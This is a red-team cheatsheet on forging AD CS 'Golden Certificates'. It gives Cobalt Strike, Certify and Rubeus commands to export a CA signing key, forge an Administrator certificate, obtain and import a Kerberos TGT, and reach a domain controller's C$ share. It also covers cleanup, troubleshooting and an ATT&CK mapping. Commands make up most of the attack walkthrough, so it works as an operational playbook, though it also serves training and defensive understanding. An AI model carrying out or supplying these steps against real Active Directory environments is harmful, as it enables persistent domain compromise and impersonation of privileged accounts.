---
title: "AD CS Golden Certificates \u00b7 DPERSIST1"
description: "Export an accessible CA signing key, forge a certificate with the lab identity fields, validate certificate authentication and distinguish CA compromise from krbtgt compromise."
category: "AD CS"
tools: ["Cobalt Strike", "Certify", "Rubeus", "Kerbeus BOF"]
updated: "2026-11-16"
tags: ["adcs", "golden-certificates"]
draft: false
---

## 1. Why the attack works

A CA signing private key can sign certificates outside normal enrollment. If a relying party trusts that CA and accepts the resulting certificate's usage, mapping and validation, the forged certificate may authenticate as the represented account.

This is a **CA-key compromise**, not possession of `krbtgt`'s Kerberos key. A Golden Certificate can be used to obtain a legitimate TGT through certificate authentication; a Golden Ticket is itself a forged TGT.

| Requirement | Verify |
|---|---|
| CA host access | Sufficient privilege on the actual signing CA |
| Usable signing key | Exportable or otherwise accessible private signing material; hardware protection may prevent extraction |
| Trust and validation | Appropriate trusted chain, NTAuth where relevant, EKU and revocation information |
| Identity mapping | Certificate fields accepted for the intended account |

## 2. Export the CA certificate and private key

```shell
beacon> run hostname
# Expected CA host in the notes: lon-cs-1.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
# Select the CA signing certificate PFX, not an unrelated machine certificate.
```

```powershell
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\contoso-root-ca.pfx', [Convert]::FromBase64String('<CA_SIGNING_PFX_BASE64>'))
```

A public CA certificate without its private key cannot sign a new certificate. Host compromise does not guarantee extraction of a hardware-protected CA key.

## 3. Forge the lab certificate

```powershell
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert 'C:\Users\Attacker\Desktop\contoso-root-ca.pfx' --quiet --upn Administrator --subject 'CN=Administrator,CN=Users,DC=contoso,DC=com' --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl 'ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com'
# Retain the forged end-entity PFX, not the CA signing PFX, for authentication.
```

The SID here is the target account SID, including RID `500`, unlike a ticket-forgery argument asking for the domain SID. The CRL location is the lab's value; it must correspond to an appropriate validation path in the real environment. Quoting keeps spaces in the DN and LDAP URL within their arguments.

## Authenticate with the certificate

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:<FORGED_END_ENTITY_PFX_BASE64> /enctype:aes256 /nowrap
# Retain the returned TGT; this command does not import it.
```

The PFX must contain the private key. Verify certificate trust, validity, authentication usage, revocation availability and account mapping. An issued PFX does not prove that the KDC will accept it as the requested identity.

## Import and verify the TGT

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
```

Confirm the ticket client is `Administrator` and its service is `krbtgt/CONTOSO.COM`. Select one import path. Then verify an operation that the represented account is authorized to perform.

```shell
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

```shell
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <CREATED_PID>
```

Purging a ticket cache does not revoke the certificate. Record the issued request IDs and certificate serials for revocation through the CA when required.

## CA compromise is not session cleanup

Removing exported PFX files or purging TGTs does not invalidate copies of a stolen CA signing key. Recovery requires a coordinated PKI response, including affected trust and certificates. Resetting `krbtgt` alone does not remove the ability to sign another certificate with that CA key.

## Troubleshooting

| Symptom | Check |
|---|---|
| Forged certificate rejected | Correct signing key, chain trust, identity mapping, EKU, validity and revocation paths |
| PKINIT fails | PFX includes its private key, PFX password if set, DC certificate/PKINIT support, clock and account mapping |
| Ticket imports but access is denied | Actual client identity, selected session, SPN and resource permissions |

## Quick checklist

```text
[ ] Confirm elevated access to the signing CA and actual private-key availability.
[ ] Identify the correct CA signing certificate and trusted chain.
[ ] Export the CA PFX with its private key.
[ ] Forge an end-entity certificate with consistent target identity, SID and validation information.
[ ] Authenticate with the forged end-entity PFX, not the CA PFX.

AUTHENTICATE AND VERIFY
[ ] Obtain the final PFX with its private key; verify the intended identity.
[ ] Rubeus asktgt /certificate:<PFX_BASE64> -> retain the returned TGT.
# Rubeus Alternative
[ ] createnetonly /ticket:<TGT_BASE64> -> record PID, then steal_token <CREATED_PID>.
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
[ ] run klist -> verify client, realm, service and expiration.
[ ] Test actual resource authorization for this identity.

CLEANUP
[ ] Purge only the disposable session, then rev2self.
[ ] Kill only the process created by the Rubeus alternative.
[ ] Remove exported private-key material when no longer needed; handle certificate revocation separately.
[ ] Treat CA signing-key recovery separately from local file and ticket cleanup.
```

## MITRE ATT&CK

| Behavior in this guide | ATT&CK reference |
|---|---|
| Abusing certificates for authentication | [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |

## Related references

- [Golden Tickets](/cheatsheets/golden-ticket-cheatsheet/)
- [AD CS enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [Certify](https://github.com/GhostPack/Certify)
- [Rubeus](https://github.com/GhostPack/Rubeus)
